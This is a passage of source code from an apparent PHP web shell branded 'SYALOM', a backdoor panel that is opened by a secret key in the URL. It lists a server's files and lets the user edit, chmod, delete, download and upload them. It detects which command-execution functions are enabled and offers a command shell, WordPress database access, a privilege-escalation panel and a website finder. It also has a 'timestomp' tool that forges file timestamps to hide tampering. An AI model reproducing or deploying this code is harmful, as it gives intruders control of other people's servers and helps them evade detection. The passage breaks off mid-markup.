    if (!$files) return '<div class="error">Cannot open directory</div>';
    
    $html = "<div class='file-actions'><button id='zipSelectedBtn' disabled>Zip Selected</button> <button id='chmodSelectedBtn' disabled style='background: #ff9800; color: #111;'>Chmod Bulk</button> <button id='timestompSelectedBtn' disabled style='background: #ff5722; color: white;'>⏰ Timestomp</button> <button id='deleteSelectedBtn' disabled style='background: #d32f2f; color: white;'>Delete Selected</button></div>";
    $html .= "<table class='file-table' data-sort-col='2' data-sort-dir='asc'><thead><tr>";
    $html .= "<th><input type='checkbox' id='selectAll'></th>";
    $html .= "<th></th>";
    $html .= "<th class='sortable sort-asc' onclick='sortTable(2)'>Name <span class='sort-indicator'>↑</span></th>";
    $html .= "<th class='sortable' onclick='sortTable(3)'>Permissions <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(4)'>Size <span class='sort-indicator'></span></th>";
    $html .= "<th class='sortable' onclick='sortTable(5)'>Modified <span class='sort-indicator'></span></th>";
    $html .= "<th>Actions</th>";
    $html .= "</tr></thead><tbody>";
    
    if (realpath($path) !== '/') {
        $parent = dirname($path);
        $html .= "<tr><td></td><td></td><td colspan='5'><a href='?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($parent) . "'>[..]</a></td></tr>";
    }
    
    // Pisahkan direktori dan file, lalu sort berdasarkan nama A-Z
    $dirs = [];
    $files_list = [];
    
    foreach ($files as $f) {
        if ($f === "." || $f === "..") continue;
        $full = $path . DIRECTORY_SEPARATOR . $f;
        if (is_dir($full)) {
            $dirs[] = $f;
        } else {
            $files_list[] = $f;
        }
    }
    
    // Sort A-Z (case-insensitive)
    natcasesort($dirs);
    natcasesort($files_list);
    
    // Render direktori dulu, kemudian file
    foreach (array_merge($dirs, $files_list) as $f) {
        $full = $path . DIRECTORY_SEPARATOR . $f;
        $encoded = htmlspecialchars($f, ENT_QUOTES);
        $urlBase = "?masuk=" . AL_SHELL_KEY . "&d=" . urlencode($path);
        $isDir = is_dir($full);
        $icon = $isDir ? "📁" : "📄";
        $perms = substr(sprintf('%o', fileperms($full)), -4);
        $modTime = date('d-m-Y H:i:s', filemtime($full));
        $isZip = !$isDir && pathinfo($f, PATHINFO_EXTENSION) === 'zip';
        $isWritable = is_writable($full);
        $writableClass = $isWritable ? '' : 'not-writable';
        
        // Tambahkan class not-writable juga pada link nama file/folder
        $linkClass = $isDir ? 'dir-link' : 'file-link';
        if (!$isWritable) {
            $linkClass .= ' not-writable-text';
        }
        $nameLink = $isDir 
            ? "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>" 
            : "<a class='$linkClass' href='$urlBase&d=" . urlencode($full) . "'>$encoded</a>";
        
        if ($isDir) {
            $size = '-';
        } else {
            $sizeInBytes = filesize($full);
            $size = number_format($sizeInBytes / 1048576, 2) . ' MB';
        }
        
        $checkbox = "<input type='checkbox' class='file-select' value='" . htmlspecialchars($f, ENT_QUOTES) . "'>";
        $actions = "<a class='action-link' href='javascript:void(0)' onclick='viewFileAsync(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[V]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openEditModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[E]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openRenameModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[R]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openChmodModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Chmod]</a>
                   <a class='action-link' href='javascript:void(0)' onclick='openDeleteModal(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[Del]</a>
                   <a class='action-link' href='$urlBase&download=" . urlencode($f) . "' target='_blank'>[DL]</a>";
        if ($isZip) {
            $actions .= " <a class='action-link' href='javascript:void(0)' onclick='unzipFile(\"" . htmlspecialchars($f, ENT_QUOTES) . "\")'>[U]</a>";
        }
        $html .= "<tr data-filename='" . htmlspecialchars($f, ENT_QUOTES) . "'>";
        $html .= "<td>$checkbox</td>";
        $html .= "<td class='$writableClass'>$icon</td>";
        $html .= "<td>$nameLink</td>";
        $html .= "<td>$perms</td>";
        $html .= "<td>$size</td>";
        $html .= "<td>$modTime</td>";
        $html .= "<td>$actions</td>";
        $html .= "</tr>";
    }
    $html .= "</tbody></table>";
    return $html;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>::S Y A L O M::</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: 'Courier New', Courier, monospace; background: #111; color: #0f0; margin: 0; padding: 10px; }
        .container { display: flex; max-width: 1600px; margin: auto; gap: 20px; }
        .menu-panel { width: 30%; min-width: 300px; }
        .file-panel { width: 70%; }
        h1, h2, h3 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 5px; }
        input, textarea, select { width: 100%; margin-bottom: 10px; background: #222; color: #0f0; border: 1px solid #0f0; padding: 8px; box-sizing: border-box; }
        input[type="checkbox"], input[type="radio"] { width: auto; vertical-align: middle; margin-right: 8px; }
        button { padding: 8px 12px; background: #0f0; color: #111; border: none; cursor: pointer; font-weight: bold; margin-right: 5px;}
        button:disabled { background: #444; color: #666; cursor: not-allowed; }
        .output { white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #0f0; margin-top: 10px; word-wrap: break-word; }
        .section { margin-bottom: 8px; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; }
        .section pre { font-size: 11px; line-height: 1.3; }
        .section h3 { margin: 0 0 8px 0; font-size: 13px; padding-bottom: 5px; }
        .section form { margin: 0; }
        .section input, .section select, .section button { margin-bottom: 6px; padding: 5px; }
        .section p { margin: 0 0 5px 0; }
        /* Compact menu styles */
        .menu-panel h1 { margin: 0 0 10px 0; font-size: 18px; padding-bottom: 8px; }
        .menu-compact { display: flex; flex-wrap: wrap; gap: 5px; }
        .menu-compact button { flex: 1; min-width: 120px; font-size: 11px; padding: 6px; margin: 0; }
        .info-group { margin-bottom: 15px; }
        .info-group strong { color: #6cf; cursor: help; }
        .action-link { color: #fff; }
        a { color: #f0f; text-decoration: none; }
        .file-link { color: #0f0; }
        .dir-link { color: #f0f; }
        #server-info { background: #000; border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; white-space: pre-wrap; }
        #breadcrumbs { background: #1a1a1a; padding: 10px; margin-bottom: 10px; border: 1px solid #0f0; }
        #breadcrumbs a { color: #6cf; text-decoration: none; }
        #breadcrumbs a:hover { text-decoration: underline; }
        .modal { display: none; position: fixed; z-index: 10; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); justify-content: center; align-items: center; }
        .modal-content { background: #222; color: #0f0; padding: 20px; border: 2px solid #0f0; width: 90%; max-width: 700px; max-height: 80vh; overflow-y: auto; position: relative; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
        .modal-header h3 { margin: 0; border: none; }
        .modal-body { max-height: 60vh; overflow-y: auto; }
        .modal-footer { margin-top: 15px; text-align: right; }
        #viewContent, #serverInfoContent, #searchResultsContent { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 400px; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
        #shellOutput { background: #111; padding: 10px; border: 1px solid #0f0; max-height: 70vh; overflow: auto; white-space: pre-wrap; word-wrap: break-word; }
        .modal textarea { width: 100%; height: 300px; }
        .modal.active { display: flex; }
        .shell-shortcuts { margin-top: 0; flex: 1; overflow: hidden; display: flex; flex-direction: column; }
        .shell-shortcuts strong { color: #6cf; display: block; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #333; padding-bottom: 8px; }
        .shortcut-list { max-height: none; overflow-y: auto; padding-right: 5px; flex: 1; }
        .shortcut-item { cursor: pointer; padding: 10px; margin: 4px 0; border: 1px solid #333; border-radius: 4px; display: flex; flex-direction: column; transition: all 0.2s; background: #1a1a1a; }
        .shortcut-item:hover { background-color: #252525; border-color: #0f0; }
        .shell-left .shortcut-item code { background: #0f0; color: #000; padding: 4px 10px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 11px; font-weight: bold; border: 1px solid #0f0; margin-bottom: 6px; display: inline-block; align-self: flex-start; }
        .shell-left .shortcut-desc { color: #aaa; font-size: 10px; margin-left: 0; line-height: 1.4; }
        .shell-left .shortcut-desc strong { color: #ff0; font-size: 10px; border: none; padding: 0; display: inline; margin: 0; }
        .db-sidebar .shortcut-item { flex-direction: row; }
        .db-sidebar .shortcut-item code { background: #1a1a1a; color: #0f0; padding: 4px 10px; border-radius: 3px; font-family: 'Courier New', monospace; font-size: 12px; font-weight: bold; min-width: 140px; display: inline-block; border: 1px solid #0f0; }
        .db-sidebar .shortcut-desc { color: #888; font-size: 11px; margin-left: 12px; }
        .shortcut-item:hover .shortcut-desc { color: #ddd; }
        .shortcut-divider { border-top: 2px solid #0f0; margin: 15px 0; }
        .shortcut-list::-webkit-scrollbar, #shellOutput::-webkit-scrollbar, .discover-content::-webkit-scrollbar { width: 8px; height: 8px; }
        .shortcut-list::-webkit-scrollbar-track, #shellOutput::-webkit-scrollbar-track, .discover-content::-webkit-scrollbar-track { background: #111; }
        .shortcut-list::-webkit-scrollbar-thumb, #shellOutput::-webkit-scrollbar-thumb, .discover-content::-webkit-scrollbar-thumb { background: #0f0; border-radius: 4px; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .file-actions { margin-bottom: 10px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { border: 1px solid #0f0; padding: 8px; text-align: left; }
        .file-table th { background-color: #222; cursor: pointer; user-select: none; }
        .file-table th:hover { background-color: #333; }
        .file-table tbody tr:nth-child(even) { background-color: #1a1a1a; }
        .file-table tbody tr:hover { background-color: #2a2a2a; }
        .not-writable { color: #f44; }
        .not-writable-text { color: #f44 !important; }
        .not-writable-text:hover { color: #ff6666 !important; }
        /* Sortable column styles */
        .file-table th.sortable { cursor: pointer; user-select: none; }
        .file-table th.sortable:hover { background-color: #333; }
        .file-table th.sort-asc .sort-indicator, .file-table th.sort-desc .sort-indicator { color: #0f0; font-weight: bold; }
        .file-table th .sort-indicator { color: #666; margin-left: 5px; }
        /* 🔥 Privilege Escalation Styles */
        /* Compact Privesc Styles */
        .privesc-output { background: #000; border: 1px solid #333; padding: 8px; font-family: monospace; font-size: 11px; white-space: pre-wrap; max-height: 150px; overflow-y: auto; border-radius: 4px; }
        .chmod-options { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
        .chmod-options label { white-space: nowrap; }
        .navigation-container { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .navigation-form { display: flex; gap: 10px; }
        .navigation-form input { width: 300px; }
        .navigation-form button { white-space: nowrap; }
        .default-dir-btn { background: #6cf; color: #111; }
        .modal-content { max-width: 90vw !important; width: 90vw !important; }
        .modal-wide { max-height: 85vh !important; display: flex; flex-direction: column; }
        .shell-container { display: flex; gap: 0; flex: 1; overflow: hidden; min-height: 500px; }
        .shell-left { width: 380px; min-width: 380px; border-right: 1px solid #0f0; padding: 15px; overflow-y: auto; background: #1a1a1a; display: flex; flex-direction: column; }
        .shell-left form { display: flex; gap: 8px; margin-bottom: 15px; }
        .shell-left input { flex: 1; margin-bottom: 0; }
        .shell-left button { margin: 0; white-space: nowrap; }
        .shell-right { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 15px; background: #111; }
        .shell-output-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 10px; border-bottom: 1px solid #333; }
        .shell-output-header strong { color: #6cf; }
        #shellOutput { flex: 1; overflow: auto; background: #000; border: 1px solid #0f0; padding: 15px; margin: 0; font-size: 12px; line-height: 1.5; }
        .modal-discover { width: 95vw !important; height: 95vh !important; max-width: 95vw !important; max-height: 95vh !important; display: flex; flex-direction: column; }
        .discover-container { display: flex; gap: 0; flex: 1; overflow: hidden; padding: 0 !important; }
        .discover-sidebar { width: 300px; min-width: 300px; border-right: 1px solid #0f0; padding: 20px; overflow-y: auto; background: #1a1a1a; }
        .discover-main { flex: 1; overflow: hidden; display: flex; flex-direction: column; background: #111; }
        .discover-content { flex: 1; overflow-y: auto; padding: 20px; }
        .discover-placeholder { text-align: center; padding: 50px 20px; }
        .search-type-selector { display: flex; gap: 8px; }
        .search-type { flex: 1; border: 1px solid #333; border-radius: 6px; padding: 10px; cursor: pointer; transition: all 0.2s; background: #222; font-size: 11px; text-align: center; }
        .search-type:hover { border-color: #6cf; background: #2a2a2a; }
        .search-type.active { border-color: #6cf; background: #6cf; color: #111; font-weight: bold; }
        .scan-modes { display: flex; flex-direction: column; gap: 8px; }
        .scan-mode { border: 1px solid #333; border-radius: 6px; padding: 10px; cursor: pointer; transition: all 0.2s; background: #222; }
        .scan-mode:hover { border-color: #0f0; background: #2a2a2a; }
        .scan-mode.active { border-color: #0f0; background: #0f0; color: #111; }
        .scan-mode.active .scan-desc { color: #333; }
        .scan-mode strong { display: block; font-size: 12px; margin-bottom: 3px; }
        .scan-desc { font-size: 9px; color: #888; line-height: 1.3; }
        .website-item { border: 1px solid #0f0; margin: 10px 0; padding: 15px; background: #1a1a1a; border-radius: 6px; transition: all 0.2s; }
        .website-item:hover { background: #222; border-color: #6cf; }
        .website-item.priority { border-width: 2px; border-color: #ff0; background: #2a2a00; }
        .website-item.priority:hover { background: #333300; }
        .website-title { color: #ff0; font-size: 14px; font-weight: bold; margin-bottom: 5px; }
        .website-path { background: #000; padding: 8px; border-radius: 3px; font-family: monospace; font-size: 11px; color: #0f0; word-break: break-all; margin: 8px 0; }
        .website-meta { font-size: 11px; color: #888; margin-top: 8px; }
        .website-meta span { margin-right: 15px; }
        .website-badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 10px; margin-left: 8px; }
        .badge-writable { background: #f44; color: #fff; }
        .badge-readonly { background: #666; color: #fff; }
        .badge-title { background: #ff0; color: #000; font-weight: bold; }
        .drop-zone { border: 2px dashed #0f0; border-radius: 6px; padding: 15px; text-align: center; background: #1a1a1a; transition: all 0.3s; cursor: pointer; min-height: 120px; display: flex; flex-direction: column; justify-content: center; }
        .drop-zone:hover { background: #222; border-color: #6cf; }
        .drop-zone.drag-over { background: #0f0; border-color: #fff; }
        .drop-zone.drag-over .drop-icon, .drop-zone.drag-over .drop-text, .drop-zone.drag-over .drop-or { color: #000; }
        .drop-zone-content { pointer-events: none; }
        .drop-icon { font-size: 40px; display: block; margin-bottom: 10px; }
        .drop-text { color: #0f0; font-size: 14px; margin: 5px 0; }
        .drop-or { color: #666; font-size: 12px; margin: 5px 0; }
        .drop-button { display: inline-block; padding: 8px 20px; background: #0f0; color: #111; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px; pointer-events: auto; }
        .drop-button:hover { background: #6cf; }
        .drop-file-list { margin-top: 15px; text-align: left; max-height: 200px; overflow-y: auto; }
        .drop-file-item { background: #222; border: 1px solid #0f0; padding: 8px 12px; border-radius: 4px; margin: 5px 0; display: flex; justify-content: space-between; align-items: center; }
        .drop-file-name { color: #0f0; font-size: 12px; word-break: break-all; }
        .drop-file-size { color: #888; font-size: 11px; margin-left: 10px; }
        .drop-file-remove { color: #f44; cursor: pointer; font-size: 16px; padding: 0 5px; }
        .drop-file-remove:hover { color: #f88; }
        .modal-fullscreen { max-width: 95vw !important; width: 95vw !important; height: 90vh !important; }
        .db-manager-body { display: flex; gap: 0; padding: 0 !important; height: calc(90vh - 120px); }
        .db-sidebar { width: 250px; min-width: 250px; border-right: 1px solid #0f0; padding: 15px; overflow-y: auto; background: #1a1a1a; }
        .db-sidebar ul { list-style: none; padding: 0; margin: 0; }
        .db-sidebar li { padding: 8px 10px; margin: 2px 0; cursor: pointer; border-radius: 4px; font-size: 12px; font-family: monospace; color: #0f0; }
        .db-sidebar li:hover { background: #252525; }
        .db-main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        .db-query-section { padding: 15px; border-bottom: 1px solid #333; background: #1a1a1a; }
        .db-query-input { display: flex; gap: 10px; }
        .db-query-input textarea { flex: 1; height: 80px; margin-bottom: 0; resize: none; }
        .db-query-buttons { display: flex; flex-direction: column; gap: 5px; }
        .db-result-section { flex: 1; overflow: auto; padding: 15px; }
        .db-result-section table th { background: #222; padding: 10px; text-align: left; border-bottom: 2px solid #0f0; color: #6cf; }
        .db-result-section table td { padding: 8px 10px; border-bottom: 1px solid #333; font-size: 12px; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .db-result-section table tr:hover td { background: #1a1a1a; }
    </style>
</head>
<body>
<div class="container">
    <div class="menu-panel">
        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 290326 1843</h1>
        <!-- Quick Actions Row -->
        <div class="section">
            <h3>⚡ Quick Actions</h3>
            <div class="menu-compact">
                <button onclick="loadAndShowServerInfo()">🖥️ Server Info</button>
                <button onclick="openModal('shellModal')">💻 Shell</button>
            </div>
        </div>
        <!-- Search Section - Compact -->
        <div class="section">
            <h3>🔍 Search</h3>
            <form id="searchForm">
                <input type="text" name="search_term" id="searchTermInput" placeholder="Enter search term..." style="margin-bottom: 4px;">
                <div style="margin-bottom: 4px; font-size: 11px;">
                    <label style="margin-right: 8px;"><input type="radio" name="search_type" value="filename" checked> File</label>
                    <label><input type="radio" name="search_type" value="content"> Content</label>
                </div>
                <div style="margin-bottom: 4px; font-size: 11px;">
                    <label><input type="checkbox" name="search_root" id="searchRootCheckbox"> From root (/)</label>
                </div>
                <button type="submit" style="width: 100%;">🔍 Search</button>
            </form>
        </div>
        <!-- Upload Section - Compact -->
        <div class="section">
            <h3>📤 Upload</h3>
            <form method="post" enctype="multipart/form-data" id="uploadForm">
                <div id="dropZone" class="drop-zone" style="min-height: 80px; padding: 10px;">
                    <div class="drop-zone-content">
                        <span class="drop-icon" style="font-size: 24px; margin-bottom: 5px;">📁</span>
                        <p class="drop-text" style="font-size: 12px; margin: 2px 0;">Drop files here</p>
                        <label for="uploadFileInput" class="drop-button" style="padding: 4px 12px; font-size: 11px;">Browse</label>
                        <input type="file" name="upload_file[]" id="uploadFileInput" style="display: none;" multiple>
                    </div>
                    <div class="drop-file-list" id="dropFileList"></div>
                </div>
                <button type="submit" id="uploadSubmitBtn" style="margin-top: 6px; width: 100%; padding: 6px; font-size: 11px;" disabled>📤 Upload <span id="fileCount">0</span></button>
            </form>
        </div>
        <!-- Create Section - Compact -->
        <div class="section">
            <h3>➕ Create</h3>
            <form method="post" style="display: flex; gap: 5px;">
                <input type="text" name="create_name" placeholder="Name" style="flex: 1; margin-bottom: 0;">
                <select name="create_type" style="width: 80px; margin-bottom: 0;">
                    <option value="file">File</option>
                    <option value="dir">Dir</option>
                </select>
                <button type="submit" style="margin-bottom: 0; padding: 5px 10px;">➕</button>
            </form>
        </div>
        <!-- Database Section - Compact -->
        <div class="section">
            <h3>🗄️ Database</h3>
            <div class="menu-compact">
                <button onclick="exploreDatabase()">🔍 Explore WP</button>
                <button onclick="openModal('dbConnectModal')">🔌 Connect</button>
            </div>
        </div>
        <!-- Privesc Section - Compact -->
        <div class="section">
            <h3>💀 Privilege Escalation</h3>
            <button onclick="openModal('privescModal')" style="background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;width:100%; padding: 8px; font-size: 12px;">💀 OPEN PRIVESC</button>
        </div>
        <!-- Website Finder Section - Compact -->
        <div class="section">
            <h3>🌐 Website Finder</h3>
            <button onclick="discoverWebsites()" style="width: 100%;">🔍 Find Websites</button>
        </div>
    </div>
    <div class="file-panel">
        <?php
        // Detect available shell execution methods
        $available_methods = [];
        $disabled_funcs = explode(',', ini_get('disable_functions'));
        if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_funcs)) $available_methods[] = 'shell_exec';
        if (function_exists('exec') && !in_array('exec', $disabled_funcs)) $available_methods[] = 'exec';
        if (function_exists('system') && !in_array('system', $disabled_funcs)) $available_methods[] = 'system';
        if (function_exists('passthru') && !in_array('passthru', $disabled_funcs)) $available_methods[] = 'passthru';
        if (function_exists('proc_open') && !in_array('proc_open', $disabled_funcs)) $available_methods[] = 'proc_open';
        if (function_exists('popen') && !in_array('popen', $disabled_funcs)) $available_methods[] = 'popen';
        $exec_status = count($available_methods) > 0 ? '🟢 Shell: ' . implode(', ', $available_methods) : '🔴 Shell: Disabled';
        ?>
        <div id="server-info"><strong>Server Info:</strong><br><?php echo htmlspecialchars($server_info) ?><br><strong>SOFT:</strong> <?php echo htmlspecialchars($software_info) ?> <strong>PHP:</strong> <?php echo htmlspecialchars($php_version) ?><br><strong>Path:</strong> <?php echo htmlspecialchars($dir) ?><br><strong>IP:</strong> <?php echo htmlspecialchars($server_ip) ?><br><?php echo $exec_status; ?></div>
        <div class="navigation-container">
            <div id="breadcrumbs"><?php echo generate_breadcrumbs($dir) ?></div>
            <div class="navigation-form">
                <form method="post" id="navigateForm" style="display: flex; gap: 10px;">
                    <input type="hidden" name="action" value="navigate_to_dir">
                    <input type="text" name="target_dir" id="targetDirInput" placeholder="/path/to/directory" value="<?php echo htmlspecialchars($dir) ?>">
                    <button type="submit">Go</button>
                </form>
                <button class="default-dir-btn" onclick="goToDefaultDirectory()">Default</button>
            </div>
        </div>
        <?php echo list_dir($dir) ?>
    </div>
</div>
<div class="output" style="display:none;"><?php echo htmlspecialchars($output) ?></div>
<div class="modal" id="viewModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="viewTitle"></h3>
            <button onclick="copyToClipboard('viewContent')">📋 Copy</button>
        </div>
        <div class="modal-body">
            <pre id="viewContent">⏳ Loading...</pre>
        </div>
        <div class="modal-footer">
            <button onclick="closeModal('viewModal')">Close</button>
        </div>
    </div>
</div>
<div class="modal" id="editModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="editTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="edit_file" id="editFile">
            <textarea name="file_content" id="editContent"></textarea>
            <div class="modal-footer">
                <button type="submit" name="save_edit">Save</button>
                <button type="button" onclick="closeModal('editModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="renameModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="renameTitle"></h3>
        </div>
        <form method="post">
            <input type="hidden" name="rename_target" id="renameTarget">
            <input type="text" name="new_name" placeholder="New name">
            <div class="modal-footer">
                <button type="submit">Rename</button>
                <button type="button" onclick="closeModal('renameModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="chmodModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3 id="chmodTitle"></h3>
        </div>
        <form id="chmodForm" method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="chmod_target" id="chmodTarget">
            <div class="chmod-options">
                <label for="chmodPermSelect">Permissions:</label>
                <select name="chmod_perm" id="chmodPermSelect">
                    <option value="755">755 (rwxr-xr-x)</option>
                    <option value="644">644 (rw-r-r-)</option>
                    <option value="777">777 (rwxrwxrwx)</option>
                    <option value="600">600 (rw----)</option>
                    <option value="750">750 (rwxr-x--)</option>
                    <option value="custom">Custom...</option>
                </select>
            </div>
            <div id="customPermDiv" style="display:none; margin-bottom: 10px;">
                <label for="customPermInput">Custom Value (e.g., 755 or u+rwx):</label>
                <input type="text" name="custom_perm" id="customPermInput" placeholder="755">
            </div>
            <div class="chmod-options">
                <input type="checkbox" name="chmod_recursive" id="chmodRecursive">
                <label for="chmodRecursive">Recursive (apply to contents of directory)</label>
            </div>
            <div class="modal-footer">
                <button type="submit">Apply</button>
                <button type="button" onclick="closeModal('chmodModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<div class="modal" id="confirmDeleteModal">
    <div class="modal-content">
        <div class="modal-header">
            <h3>Confirm Delete</h3>
        </div>
        <p id="deleteMessage"></p>
        <form method="post">
            <input type="hidden" name="delete_target" id="deleteTarget">
            <div class="modal-footer">
                <button type="submit">Delete</button>
                <button type="button" onclick="closeModal('confirmDeleteModal')">Cancel</button>
            </div>
        </form>
    </div>
</div>
<!-- Chmod Bulk Modal -->
<div class="modal" id="chmodBulkModal">
    <div class="modal-content" style="max-width: 800px; width: 90vw; max-height: 90vh; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <h3>🔧 Chmod Bulk</h3>
            <button onclick="closeModal('chmodBulkModal')" style="padding: 4px 12px;">✕</button>
        </div>
        <div style="padding: 15px; overflow-y: auto; flex: 1;">
            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                <div style="flex: 1; min-width: 200px;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">
                        Selected: <span id="chmodBulkCount" style="color: #0f0; font-weight: bold;">0</span> items
                    </label>
                    <select id="chmodBulkPerm" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
                        <option value="755">755 (rwxr-xr-x) - Executable</option>
                        <option value="644" selected>644 (rw-r--r--) - Standard File</option>
                        <option value="777">777 (rwxrwxrwx) - Full Access</option>
                        <option value="600">600 (rw-------) - Private</option>
                        <option value="750">750 (rwxr-x---) - Restricted</option>
                        <option value="custom">Custom...</option>
                    </select>
                </div>
                <div id="chmodBulkCustomDiv" style="flex: 1; min-width: 200px; display: none;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">Custom:</label>
                    <input type="text" id="chmodBulkCustomInput" placeholder="e.g., 755, u+rwx" style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px;">
                </div>
                <div style="flex: 1; min-width: 200px; display: flex; align-items: flex-end;">
                    <label style="font-size: 12px; color: #888; display: flex; align-items: center; cursor: pointer; padding: 8px; background: #1a1a1a; border-radius: 4px; border: 1px solid #333;">
                        <input type="checkbox" id="chmodBulkRecursive" style="margin-right: 8px;">
                        <span>🔁 Recursive (subfolders)</span>
                    </label>
                </div>
            </div>
            
            <div id="chmodBulkProgress" style="display: none; margin-bottom: 15px; padding: 10px; background: #111; border: 1px solid #333; border-radius: 4px;">
                <div style="font-size: 11px; color: #888; margin-bottom: 5px;">
                    Progress: <span id="chmodBulkCurrent" style="color: #0f0; font-weight: bold;">0</span> / <span id="chmodBulkTotal">0</span>
                </div>
                <div style="height: 6px; background: #333; border-radius: 3px; overflow: hidden;">
                    <div id="chmodBulkProgressBar" style="height: 100%; background: linear-gradient(90deg, #0f0, #6cf); width: 0%; transition: width 0.3s;"></div>
                </div>
                <div id="chmodBulkStatus" style="font-size: 11px; color: #6cf; margin-top: 5px;">Initializing...</div>
            </div>
            
            <div id="chmodBulkResults" style="display: none; max-height: 50vh; overflow-y: auto; font-size: 12px; font-family: monospace; background: #000; padding: 10px; border: 1px solid #333; border-radius: 4px;"></div>
        </div>
        <div class="modal-footer" style="flex-shrink: 0; border-top: 1px solid #333; padding: 10px 15px;">
            <button id="chmodBulkExecuteBtn" onclick="executeChmodBulk()" style="background: #ff9800; color: #111; font-weight: bold; padding: 8px 20px;">🚀 Execute</button>
            <button type="button" onclick="closeModal('chmodBulkModal')" id="chmodBulkCloseBtn" style="padding: 8px 20px;">Cancel</button>
        </div>
    </div>
</div>

<!-- 🔥 TIMESTOMP BULK MODAL -->
<div class="modal" id="timestompBulkModal">
    <div class="modal-content" style="max-width: 800px; width: 90vw; max-height: 90vh; display: flex; flex-direction: column;">
        <div class="modal-header" style="flex-shrink: 0;">
            <h3>⏰ Timestomp Bulk</h3>
            <button onclick="closeModal('timestompBulkModal')" style="padding: 4px 12px;">✕</button>
        </div>
        <div style="padding: 15px; overflow-y: auto; flex: 1;">
            <div style="background: #1a1a1a; border: 1px solid #333; padding: 10px; border-radius: 4px; margin-bottom: 15px; font-size: 11px; color: #888;">
                <strong style="color: #f80;">ℹ️ Info:</strong> Timestomp mengubah timestamp modification (mtime) dan access (atime) file. 
                Format waktu: <code style="background: #000; padding: 2px 4px;">DD-MM-YYYY HH:MM:SS</code>
            </div>
            
            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                <div style="flex: 2; min-width: 250px;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">
                        Selected: <span id="timestompBulkCount" style="color: #f80; font-weight: bold;">0</span> items
                    </label>
                    <label style="font-size: 12px; color: #f80; display: block; margin-bottom: 5px;">⏰ Timestamp (DD-MM-YYYY HH:MM:SS):</label>
                    <input type="text" id="timestompBulkTime" placeholder="31-12-2026 23:59:59" 
                           style="width: 100%; padding: 8px; background: #222; color: #f80; border: 1px solid #f80; border-radius: 4px; font-family: monospace;">
                </div>
                <div style="flex: 1; min-width: 200px;">
                    <label style="font-size: 12px; color: #888; display: block; margin-bottom: 5px;">📋 Quick Presets:</label>
                    <select id="timestompBulkPreset" onchange="applyTimestompPreset(this.value)" 
                            style="width: 100%; padding: 8px; background: #222; color: #0f0; border: 1px solid #0f0; border-radius: 4px; margin-bottom: 8px;">
                        <option value="">-- Select Preset --</option>
                        <option value="/etc/passwd">📄 /etc/passwd</option>
                        <option value="/bin/ls">🔧 /bin/ls</option>
                        <option value="/etc/hosts">📄 /etc/hosts</option>
                        <option value="1year">📅 1 Year Ago</option>
                        <option value="6months">📅 6 Months Ago</option>
                        <option value="1month">📅 1 Month Ago</option>
                        <option value="1week">📅 1 Week Ago</option>
                        <option value="yesterday">📅 Yesterday</option>
                        <option value="now">⏰ Now (Current)</option>
                    </select>
                </div>
            </div>
            
            <div style="display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;">
                <div style="flex: 1; min-width: 200px;">
